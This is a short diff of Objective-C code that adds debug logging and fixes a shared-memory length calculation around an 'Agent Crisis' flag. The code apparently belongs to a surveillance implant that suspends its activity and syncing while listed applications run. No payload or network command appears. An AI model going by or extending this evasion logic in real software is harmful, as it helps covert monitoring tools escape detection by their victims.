@@ -1266,10 +1266,14 @@ static NSLock *gSyncLock                  = nil;
     case AGENT_CRISIS:
       {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"%s: Starting Agent Crisis");
+        infoLog(@"Starting Agent Crisis 0x%x", gAgentCrisis);
 #endif
         gAgentCrisis |= CRISIS_START;
 
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Agent Crisis 0x%x", gAgentCrisis);
+#endif
+        
         RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis started"];
         [infoManager release];
@@ -1744,10 +1748,14 @@ static NSLock *gSyncLock                  = nil;
     case AGENT_CRISIS:
       {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"%s: Stopping Agent Crisis");
+        infoLog(@"Stopping Agent Crisis 0x%x", gAgentCrisis);
 #endif
-        gAgentCrisis &= ~CRISIS_STARTSTOP;
-
+        gAgentCrisis &= ~(CRISIS_STARTSTOP);
+        
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Agent Crisis 0x%x (0x%x)", gAgentCrisis, ~(CRISIS_STARTSTOP));
+#endif
+        
         RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis stopped"];
         [infoManager release];
@@ -2471,12 +2479,14 @@ static NSLock *gSyncLock                  = nil;
                   
                   UInt32 tmpNum = [gAgentCrisisApp count];
                   
-                  [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
-                  
                   int tmpLen = sizeof(shMemoryHeader->commandData);
                   
                   unichar padZero=0;
                   NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
+                  
+                  [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
+                  
+                  tmpLen -= sizeof(UInt32);
                   
                   for (int i=0; i < [gAgentCrisisApp count]; i++)
                   {
@@ -2889,7 +2899,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"%s: Stopping Agent Crisis");
 #endif
-                gAgentCrisis &= ~CRISIS_STARTSTOP;
+                gAgentCrisis &= ~(CRISIS_STARTSTOP);
 
                 RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
                 [infoManager logActionWithDescription: @"Crisis stopped"];
@@ -3110,7 +3120,7 @@ static NSLock *gSyncLock                  = nil;
         if ((gAgentCrisis & CRISIS_START) && (gAgentCrisis & CRISIS_SYNC))
         {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"CRISIS_SYNC actived do not sync");
+          infoLog(@"CRISIS_SYNC actived do not sync 0x%x", gAgentCrisis);
 #endif
           break;
         }  
